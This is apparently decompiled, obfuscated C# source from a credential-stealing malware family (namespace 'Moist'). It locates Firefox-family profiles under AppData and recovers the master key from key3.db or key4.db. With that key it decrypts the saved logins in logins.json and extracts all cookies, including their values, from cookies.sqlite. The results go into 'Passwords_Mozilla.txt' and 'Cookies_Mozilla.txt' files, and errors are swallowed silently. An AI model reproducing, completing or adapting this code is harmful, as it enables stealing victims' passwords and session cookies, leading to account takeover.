using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Moist;

// Token: 0x02000043 RID: 67
internal class Class12
{
	// Token: 0x060001DE RID: 478 RVA: 0x0000EEE0 File Offset: 0x0000D0E0
	public static List<string> smethod_0(string string_3, int int_1 = 4, int int_2 = 1, params string[] files)
	{
		List<string> list = new List<string>();
		List<string> result;
		if (files == null || files.Length == 0 || int_2 > int_1)
		{
			result = list;
		}
		else
		{
			try
			{
				string[] directories = Directory.GetDirectories(string_3);
				foreach (string path in directories)
				{
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						FileInfo[] files2 = directoryInfo.GetFiles();
						bool flag = false;
						int num = 0;
						while (num < files2.Length && !flag)
						{
							int num2 = 0;
							while (num2 < files.Length && !flag)
							{
								string a = files[num2];
								FileInfo fileInfo = files2[num];
								if (a == fileInfo.Name)
								{
									flag = true;
									list.Add(fileInfo.FullName);
								}
								num2++;
							}
							num++;
						}
						foreach (string item in Class12.smethod_0(directoryInfo.FullName, int_1, int_2 + 1, files))
						{
							if (!list.Contains(item))
							{
								list.Add(item);
							}
						}
					}
					catch
					{
					}
				}
				result = list;
			}
			catch
			{
				result = list;
			}
		}
		return result;
	}

	// Token: 0x060001DF RID: 479 RVA: 0x0000F034 File Offset: 0x0000D234
	public static void smethod_1(string string_3, string string_4, string string_5)
	{
		try
		{
			if (File.Exists(Path.Combine(string_3, "key3.db")))
			{
				Class12.smethod_8(string_3, Class12.smethod_10(Class12.smethod_5(Path.Combine(string_3, "key3.db"))), string_4, string_5);
			}
			Class12.smethod_8(string_3, Class12.smethod_9(Class12.smethod_5(Path.Combine(string_3, "key4.db"))), string_4, string_5);
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060001E0 RID: 480 RVA: 0x0000F0A4 File Offset: 0x0000D2A4
	public static void smethod_2()
	{
		List<string> list = new List<string>();
		list.AddRange(Class12.smethod_0(Class12.string_0, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		list.AddRange(Class12.smethod_0(Class12.string_2, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		foreach (string text in list)
		{
			string fullName = new FileInfo(text).Directory.FullName;
			string string_ = text.Contains(Class12.string_2) ? Class12.smethod_12(fullName) : Class12.pbkrPshvsy(fullName);
			string string_2 = Class12.smethod_4(fullName);
			Class12.smethod_7(fullName, string_, string_2);
			string text2 = "";
			foreach (string str in Class12.list_1)
			{
				text2 += str;
			}
			if (text2 != "")
			{
				File.WriteAllText(Help.Cookies + "\\Cookies_Mozilla.txt", text2, Encoding.Default);
			}
		}
	}

	// Token: 0x060001E1 RID: 481 RVA: 0x0000F220 File Offset: 0x0000D420
	public static void smethod_3()
	{
		List<string> list = new List<string>();
		list.AddRange(Class12.smethod_0(Class12.string_0, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		list.AddRange(Class12.smethod_0(Class12.string_2, 4, 1, new string[]
		{
			"key3.db",
			"key4.db",
			"cookies.sqlite",
			"logins.json"
		}));
		foreach (string text in list)
		{
			string fullName = new FileInfo(text).Directory.FullName;
			string string_ = text.Contains(Class12.string_2) ? Class12.smethod_12(fullName) : Class12.pbkrPshvsy(fullName);
			string string_2 = Class12.smethod_4(fullName);
			Class12.smethod_1(fullName, string_, string_2);
			string text2 = "";
			foreach (string str in Class12.list_4)
			{
				text2 = text2 + str + Environment.NewLine;
			}
			if (text2 != "")
			{
				File.WriteAllText(Help.Passwords + "\\Passwords_Mozilla.txt", text2, Encoding.Default);
			}
		}
	}

	// Token: 0x060001E2 RID: 482 RVA: 0x0000F3A4 File Offset: 0x0000D5A4
	private static string smethod_4(string string_3)
	{
		try
		{
			string[] array = string_3.Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			return array[array.Length - 1];
		}
		catch
		{
		}
		return "Unknown";
	}

	// Token: 0x060001E3 RID: 483 RVA: 0x0000F3EC File Offset: 0x0000D5EC
	public static string smethod_5(string string_3)
	{
		string text = Class12.smethod_6();
		File.Copy(string_3, text, true);
		return text;
	}

	// Token: 0x060001E4 RID: 484 RVA: 0x0000F40C File Offset: 0x0000D60C
	public static string smethod_6()
	{
		return Path.Combine(Class12.string_1, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode().ToString() + Thread.CurrentThread.ManagedThreadId.ToString());
	}

	// Token: 0x060001E5 RID: 485 RVA: 0x0000F470 File Offset: 0x0000D670
	public static void smethod_7(string string_3, string string_4, string string_5)
	{
		try
		{
			string string_6 = Path.Combine(string_3, "cookies.sqlite");
			CNT cnt = new CNT(Class12.smethod_5(string_6));
			cnt.ReadTable("moz_cookies");
			for (int i = 0; i < cnt.RowLength; i++)
			{
				try
				{
					Class12.list_0.Add(cnt.ParseValue(i, "host").Trim());
					Class12.list_1.Add(string.Concat(new string[]
					{
						cnt.ParseValue(i, "host").Trim(),
						"\t",
						(cnt.ParseValue(i, "isSecure") == "1").ToString(),
						"\t",
						cnt.ParseValue(i, "path").Trim(),
						"\t",
						(cnt.ParseValue(i, "isSecure") == "1").ToString(),
						"\t",
						cnt.ParseValue(i, "expiry").Trim(),
						"\t",
						cnt.ParseValue(i, "name").Trim(),
						"\t",
						cnt.ParseValue(i, "value"),
						Environment.NewLine
					}));
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060001E6 RID: 486 RVA: 0x0000F60C File Offset: 0x0000D80C
	public static void smethod_8(string string_3, byte[] byte_0, string string_4, string string_5)
	{
		try
		{
			string path = Class12.smethod_5(Path.Combine(string_3, "logins.json"));
			if (File.Exists(path))
			{
				foreach (object obj in ((IEnumerable)File.ReadAllText(path).FromJSON()["logins"]))
				{
					JsonValue jsonValue = (JsonValue)obj;
					Gecko4 gecko = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedUsername"].ToString(false)));
					Gecko4 gecko2 = Gecko1.Create(Convert.FromBase64String(jsonValue["encryptedPassword"].ToString(false)));
					string text = Regex.Replace(Gecko6.lTRjlt(byte_0, gecko.Objects[0].Objects[1].Objects[1].ObjectData, gecko.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					string text2 = Regex.Replace(Gecko6.lTRjlt(byte_0, gecko2.Objects[0].Objects[1].Objects[1].ObjectData, gecko2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
					Class12.list_3.Add(string.Concat(new string[]
					{
						"URL : ",
						jsonValue["hostname"],
						Environment.NewLine,
						"Login: ",
						text,
						Environment.NewLine,
						"Password: ",
						text2,
						Environment.NewLine
					}));
					Class12.list_4.Add(string.Concat(new string[]
					{
						"URL : ",
						jsonValue["hostname"],
						Environment.NewLine,
						"Login: ",
						text,
						Environment.NewLine,
						"Password: ",
						text2,
						Environment.NewLine
					}));
					Class12.EeFrnHmbxo++;
				}
				for (int i = 0; i < Class12.list_3.Count<string>(); i++)
				{
					Class12.list_4.Add(string.Concat(new string[]
					{
						"Browser : ",
						string_4,
						Environment.NewLine,
						"Profile : ",
						string_5,
						Environment.NewLine,
						Class12.list_3[i]
					}));
				}
				Class12.list_3.Clear();
			}
		}
		catch (Exception)
		{
		}
	}

	// Token: 0x060001E7 RID: 487 RVA: 0x0000F8F4 File Offset: 0x0000DAF4
	private static byte[] smethod_9(string string_3)
	{
		byte[] array = new byte[24];
		byte[] result;
		try
		{
			if (File.Exists(string_3))
			{
				CNT cnt = new CNT(string_3);
				cnt.ReadTable("metaData");
				string s = cnt.ParseValue(0, "item1");
				string s2 = cnt.ParseValue(0, "item2)");
				Gecko4 gecko = Gecko1.Create(Encoding.Default.GetBytes(s2));
				byte[] objectData = gecko.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				byte[] objectData2 = gecko.Objects[0].Objects[1].ObjectData;
				Gecko8 gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				gecko2.method_3();
				Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.None);
				cnt.ReadTable("nssPrivate");
				int rowLength = cnt.RowLength;
				string s3 = string.Empty;
				for (int i = 0; i < rowLength; i++)
				{
					if (cnt.ParseValue(i, "a102") == Encoding.Default.GetString(Class12.ElvrdiiYvB))
					{
						s3 = cnt.ParseValue(i, "a11");
						IL_152:
						Gecko4 gecko3 = Gecko1.Create(Encoding.Default.GetBytes(s3));
						objectData = gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
						objectData2 = gecko3.Objects[0].Objects[1].ObjectData;
						gecko2 = new Gecko8(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
						gecko2.method_3();
						array = Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, objectData2, PaddingMode.PKCS7));
						return array;
					}
				}
				goto IL_152;
			}
			result = array;
		}
		catch (Exception)
		{
			result = array;
		}
		return result;
	}

	// Token: 0x060001E8 RID: 488 RVA: 0x0000FB2C File Offset: 0x0000DD2C
	private static byte[] smethod_10(string string_3)
	{
		byte[] array = new byte[24];
		byte[] result;
		try
		{
			if (!File.Exists(string_3))
			{
				result = array;
			}
			else
			{
				new DataTable();
				Gecko9 gecko9_ = new Gecko9(string_3);
				Gecko7 gecko = new Gecko7(Class12.smethod_11(gecko9_, (string x) => x.Equals("password-check")));
				string string_4 = Class12.smethod_11(gecko9_, (string x) => x.Equals("global-salt"));
				Gecko8 gecko2 = new Gecko8(Class12.iefripvQgb(string_4), Encoding.Default.GetBytes(string.Empty), Class12.iefripvQgb(gecko.EntrySalt));
				gecko2.method_3();
				Gecko6.lTRjlt(gecko2.DataKey, gecko2.DataIV, Class12.iefripvQgb(gecko.Passwordcheck), PaddingMode.None);
				Gecko4 gecko3 = Gecko1.Create(Class12.iefripvQgb(Class12.smethod_11(gecko9_, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
				Gecko8 gecko4 = new Gecko8(Class12.iefripvQgb(string_4), Encoding.Default.GetBytes(string.Empty), gecko3.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
				gecko4.method_3();
				Gecko4 gecko5 = Gecko1.Create(Gecko1.Create(Encoding.Default.GetBytes(Gecko6.lTRjlt(gecko4.DataKey, gecko4.DataIV, gecko3.Objects[0].Objects[1].ObjectData, PaddingMode.None))).Objects[0].Objects[2].ObjectData);
				if (gecko5.Objects[0].Objects[3].ObjectData.Length <= 24)
				{
					array = gecko5.Objects[0].Objects[3].ObjectData;
					result = array;
				}
				else
				{
					Array.Copy(gecko5.Objects[0].Objects[3].ObjectData, gecko5.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
					result = array;
				}
			}
		}
		catch (Exception)
		{
			result = array;
		}
		return result;
	}

	// Token: 0x060001E9 RID: 489 RVA: 0x0000FDA4 File Offset: 0x0000DFA4
	public static byte[] iefripvQgb(string string_3)
	{
		if (string_3.Length % 2 != 0)
		{
			throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
			{
				string_3
			}));
		}
		byte[] array = new byte[string_3.Length / 2];
		for (int i = 0; i < array.Length; i++)
		{
			string s = string_3.Substring(i * 2, 2);
			array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
		}
		return array;
	}

	// Token: 0x060001EA RID: 490 RVA: 0x0000FE1C File Offset: 0x0000E01C
	private static string smethod_11(Gecko9 gecko9_0, Func<string, bool> func_0)
	{
		string text = string.Empty;
		try
		{
			foreach (KeyValuePair<string, string> keyValuePair in gecko9_0.Keys)
			{
				if (func_0(keyValuePair.Key))
				{
					text = keyValuePair.Value;
				}
			}
		}
		catch (Exception)
		{
		}
		return text.Replace("-", string.Empty);
	}

	// Token: 0x060001EB RID: 491 RVA: 0x0000FEAC File Offset: 0x0000E0AC
	private static string smethod_12(string string_3)
	{
		string text = string.Empty;
		try
		{
			string[] array = string_3.Split(new string[]
			{
				"AppData\\Roaming\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}

	// Token: 0x060001EC RID: 492 RVA: 0x0000FF28 File Offset: 0x0000E128
	private static string pbkrPshvsy(string string_3)
	{
		string text = string.Empty;
		try
		{
			string[] array = string_3.Split(new string[]
			{
				"AppData\\Local\\"
			}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
			{
				'\\'
			}, StringSplitOptions.RemoveEmptyEntries);
			text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
		}
		catch (Exception)
		{
		}
		return text.Replace(" ", string.Empty);
	}

	// Token: 0x060001ED RID: 493 RVA: 0x0000446C File Offset: 0x0000266C
	public Class12()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x060001EE RID: 494 RVA: 0x0000FFA4 File Offset: 0x0000E1A4
	// Note: this type is marked as 'beforefieldinit'.
	static Class12()
	{
		Class40.gcO0h7LzslQIW();
		Class12.EeFrnHmbxo = 0;
		Class12.int_0 = 0;
		Class12.list_0 = new List<string>();
		Class12.list_1 = new List<string>();
		Class12.list_2 = new List<string>();
		Class12.list_3 = new List<string>();
		Class12.string_0 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");
		Class12.string_1 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");
		Class12.string_2 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");
		Class12.ElvrdiiYvB = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};
		Class12.list_4 = new List<string>();
	}

	// Token: 0x040000DF RID: 223
	public static int EeFrnHmbxo;

	// Token: 0x040000E0 RID: 224
	public static int int_0;

	// Token: 0x040000E1 RID: 225
	public static List<string> list_0;

	// Token: 0x040000E2 RID: 226
	public static List<string> list_1;

	// Token: 0x040000E3 RID: 227
	public static List<string> list_2;

	// Token: 0x040000E4 RID: 228
	public static List<string> list_3;

	// Token: 0x040000E5 RID: 229
	public static readonly string string_0;

	// Token: 0x040000E6 RID: 230
	public static readonly string string_1;

	// Token: 0x040000E7 RID: 231
	public static readonly string string_2;

	// Token: 0x040000E8 RID: 232
	public static readonly byte[] ElvrdiiYvB;

	// Token: 0x040000E9 RID: 233
	public static List<string> list_4;
}
